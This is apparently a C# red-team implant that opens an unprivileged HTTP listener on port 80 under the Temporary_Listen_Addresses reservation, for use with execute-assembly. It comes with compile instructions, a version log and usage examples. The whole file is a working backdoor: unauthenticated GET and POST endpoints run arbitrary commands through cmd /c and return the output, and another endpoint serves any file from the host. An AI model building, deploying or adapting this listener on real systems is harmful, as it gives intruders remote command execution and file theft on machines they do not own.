// darksh3llRU unpriv-http-tcp80.exe

// netsh http show urlacl

//    Reserved URL            : http://+:80/Temporary_Listen_Addresses/
//        User: \Everyone
//            Listen: Yes
//            Delegate: No
//            SDDL: D:(A;;GX;;;WD)

// Features:
// - bind to /Temporary_Listen_Addresses/random-string
// - suitable to use with execute-assembly
// - status and shutdown: GET /status and GET /shutdown
// - simple code exec: GET /command?"COMMAND"
// - code exec with parameters: POST /apic, parameter: lang
// - file download: GET /file?FILENAME
// - URI path is randomized to avoid issues when unintentionally forgetting to call shutdown
// - status pages contains usage examples

// How to compile:
// C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:S:\unpriv-http-tcp80-v0.3.exe S:\unpriv-http-tcp80-v0.3.cs

// CREDITS:
// File download inspired by: https://gist.githubusercontent.com/zezba9000/04054e3128e6af413e5bc8002489b2fe/raw/6bd6c8f992e895b9840f945819ca647f8f889616/HTTPServer.cs

// Version LOG:
// Version 0.1, 04-11-2022
// - bind to /Temporary_Listen_Addresses/random-string
// - suitable to use with execute-assembly (CS)
// - status and shutdown
// - simple cmd exec
// - file download
// Version 0.2, 23-05-2023
// - POST cmd exec /apic and parameter lang="dir C:\"
// Version 0.3, 03-10-2023
// - available commands usage on the status page
// - updated file download

using System;
using System.Collections.Generic;
using System.Net;
using System.IO;
using System.Threading;
using System.Text;
using System.Diagnostics;

namespace unprivHTTP
{
	class HTTPServer
	{
		public static string pageData =
		"<!DOCTYPE>" +
		"<html>" +
		"<head>" +
		"<title>CS UnprivTCP80 HTTP listener</title>" +
		"</head>" +
		"<body>" +
		"<pre>Status and info page:</pre>" +
		"<form method=\"get\" action=\"shutdown\">" +
		"<input type=\"submit\" value=\"shutdown\">" +
		"</form>" +
		"<pre>Current host: {0}</pre>" +
		"<pre>Current process: {1}</pre>" +
		"<pre>Available calls:<pre>" +
		"<pre>1) Status page with the how-to and shutdown button: GET http://{0}{3}/status </pre>" +
		"<pre>2) Shutdown call: GET http://{0}{3}shutdown </pre>" +
		"<pre>3.1) Command exec via browser: GET http://{0}{3}command?\"dir C:\\\" </pre>" +
		"<pre>3.2) Command exec via curl: curl -v 'http://{0}{3}command?dir%20C:\\' </pre>" +
		"<pre>3.3) Command exec via curl: curl -v 'http://{0}{3}apic' -X POST -d 'lang=dir C:\\' -d 'lang=whoami' </pre>" +
        "<pre>4.1) File download via browser: GET http://{0}{3}file?C:\\Users\\Public\\LightMale_Red.png </pre>" +
		"<pre>4.2) File download via curl: curl -v 'http://{0}{3}file?C:\\Users\\Public\\LightMale_Red.png' </pre>" +
		"<pre></pre>" +
		"<pre>Command output:</pre>" +
        "<pre> {2} </pre>" +
		"</body>" +
		"</html>";

		private Thread thread;
		private volatile bool threadActive;

		private HttpListener listener;
		private string ip;
		private int port;
		private string uripath;

		public HTTPServer(string ip, int port, string uripath)
		{
			this.ip = ip;
			this.port = port;
			this.uripath = uripath;
		}

		public void Start()
		{
			if (thread != null) throw new Exception("WebSrv is active, try calling stop first");
			thread = new Thread(Listen);
			thread.Start();
		}

		public void Stop()
		{
			threadActive = false;
			if (listener != null && listener.IsListening) listener.Stop();

			if (thread != null)
			{
				thread.Join();
				thread = null;
			}

			if (listener != null)
			{
				listener.Close();
				listener = null;
			}
			System.Environment.Exit(0);
			return;
		}

		private void Listen()
		{
			threadActive = true;

			try
			{
				listener = new HttpListener();
				listener.Prefixes.Add(string.Format("http://{0}:{1}" + uripath, ip, port));
				listener.Start();
			}
			catch (Exception e)
			{
				Console.WriteLine("ERROR: " + e.Message);
				threadActive = false;
				return;
			}

			while (threadActive)
			{
				try
				{
					var context = listener.GetContext();
					if (!threadActive) break;
					ProcessContext(context);
				}
				catch (HttpListenerException e)
				{
					if (e.ErrorCode != 995) Console.WriteLine("ERROR: " + e.Message);
					threadActive = false;
				}
				catch (Exception e)
				{
					Console.WriteLine("ERROR: " + e.Message);
					threadActive = false;
				}
			}
		}

		private void ProcessContext(HttpListenerContext context)
		{
			HttpListenerRequest req = context.Request;
			HttpListenerResponse resp = context.Response;

			var curHost = req.UserHostName.ToString();
			string curProcess = Process.GetCurrentProcess().MainModule.ModuleName;

// [HttpGet('/status')]
			if ((req.HttpMethod == "GET") && (req.Url.AbsolutePath.EndsWith("/status") == true))
			{
				byte[] data = Encoding.UTF8.GetBytes(String.Format(pageData, curHost, curProcess, "", uripath));
				resp.ContentType = "text/html";
				resp.ContentEncoding = Encoding.UTF8;
				resp.ContentLength64 = data.LongLength;
				resp.OutputStream.WriteAsync(data, 0, data.Length);
			}

// [HttpGet('/shutdown')]
			if ((req.HttpMethod == "GET") && (req.Url.AbsolutePath.EndsWith("/shutdown") == true))
			{
				Console.WriteLine("Shutting down the instance...");
				this.Stop();
			}

// [HttpGet('/command?"{cmd}"')]
            if ((req.HttpMethod == "GET") && (req.Url.AbsolutePath.EndsWith("/command") == true) && (req.QueryString != null) && (req.QueryString.Count > 0))
			{
				string command = Uri.UnescapeDataString(req.QueryString[0]);
				Console.WriteLine("Executed command and results: " + command.ToString());
				try
				{
					System.Diagnostics.ProcessStartInfo procStartInfo =
						new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

					procStartInfo.RedirectStandardOutput = true;
					procStartInfo.UseShellExecute = false;
					procStartInfo.CreateNoWindow = true;
					System.Diagnostics.Process proc = new System.Diagnostics.Process();
					proc.StartInfo = procStartInfo;
					proc.Start();
					string result = proc.StandardOutput.ReadToEnd();
					result = result.Replace("<DIR>", "&lt;DIR&gt;");
					Console.WriteLine(result);

					byte[] data = Encoding.UTF8.GetBytes(String.Format(pageData, curHost, curProcess, result, uripath));
					resp.ContentType = "text/html";
					resp.ContentEncoding = Encoding.UTF8;
					resp.ContentLength64 = data.LongLength;

					resp.OutputStream.WriteAsync(data, 0, data.Length);
				}
				catch (Exception e)
				{
					Console.WriteLine("ERROR: " + e.Message);
				}
			}

// [HttpPost('/apic', 'lang')]
            if ((req.HttpMethod == "POST") && (req.Url.AbsolutePath.EndsWith("/apic") == true))
            {
                System.IO.Stream body = req.InputStream;
                System.Text.Encoding encoding = req.ContentEncoding;
                System.IO.StreamReader reader = new System.IO.StreamReader(body, encoding);
                if (req.ContentType != null)
                {
                    Console.WriteLine("Client data content type {0}", req.ContentType);
                }
                Console.WriteLine("Client data content length {0}", req.ContentLength64);

                string command = Uri.UnescapeDataString((reader.ReadToEnd()).Replace("lang=", ""));
                Console.WriteLine("Executed command and results: " + command.ToString());
                try
                {
                    System.Diagnostics.ProcessStartInfo procStartInfo =
                        new System.Diagnostics.ProcessStartInfo("cmd", "/c " + command);

                    procStartInfo.RedirectStandardOutput = true;
                    procStartInfo.UseShellExecute = false;
                    procStartInfo.CreateNoWindow = true;
                    System.Diagnostics.Process proc = new System.Diagnostics.Process();
                    proc.StartInfo = procStartInfo;
                    proc.Start();
                    string result = proc.StandardOutput.ReadToEnd();
					result = result.Replace("<DIR>", "&lt;DIR&gt;");
                    Console.WriteLine(result);

                    byte[] data = Encoding.UTF8.GetBytes(String.Format(pageData, curHost, curProcess, result, uripath));
                    resp.ContentType = "text/html";
                    resp.ContentEncoding = Encoding.UTF8;
                    resp.ContentLength64 = data.LongLength;

                    resp.OutputStream.WriteAsync(data, 0, data.Length);
                }
                catch (Exception e)
                {
                    Console.WriteLine("ERROR: " + e.Message);
                }
			}

// [HttpGet('/file?{filename}')]
            if ((req.HttpMethod == "GET") && (req.Url.AbsolutePath.EndsWith("/file") == true) && (req.QueryString != null) && (req.QueryString.Count > 0))
			{
				string filename = Uri.UnescapeDataString(req.QueryString[0]);
				if (string.IsNullOrEmpty(filename))
				{
					return;
				}

				Console.WriteLine("Loading file: " + filename);
				filename = Path.Combine(filename);

				HttpStatusCode statusCode;
				if (File.Exists(filename))
				{
					try
					{
						using (var stream = new FileStream(filename, FileMode.Open, FileAccess.Read, FileShare.Read))
						{
							context.Response.ContentType = "application/octet-stream";
							context.Response.Headers.Add("Content-Disposition", "attachment; filename = " + Path.GetFileName(filename).ToString() + "");
							context.Response.ContentLength64 = stream.Length;

							stream.CopyTo(context.Response.OutputStream);
							stream.Flush();
							context.Response.OutputStream.Flush();
						}
						statusCode = HttpStatusCode.OK;
					}
					catch (Exception e)
					{
						Console.WriteLine("ERROR: " + e.Message);
						statusCode = HttpStatusCode.InternalServerError;
					}
				}
				else
				{
					Console.WriteLine("File not found: " + filename);
					statusCode = HttpStatusCode.NotFound;
				}

				context.Response.StatusCode = (int)statusCode;
				if (statusCode == HttpStatusCode.OK)
				{
					context.Response.AddHeader("Date", DateTime.Now.ToString("r"));
					context.Response.AddHeader("Last-Modified", File.GetLastWriteTime(filename).ToString("r"));
				}
			}


            context.Response.OutputStream.Close();
		}


		public static void Main(string[] args)
		{
			string uripath = @"/Temporary_Listen_Addresses/" + Guid.NewGuid().ToString("n").Substring(0, 8) + "/";
			HTTPServer myServer;
			myServer = new HTTPServer("+", 80, uripath);
			myServer.Start();
			Console.WriteLine("\nServer started with the following parameters: " + 
			"\nURI path with the Status and How-To: " + uripath.ToString() + "status" + 
			"\nPORT: " + myServer.port.ToString());

			myServer.Stop();
			return;
		}
	}
}
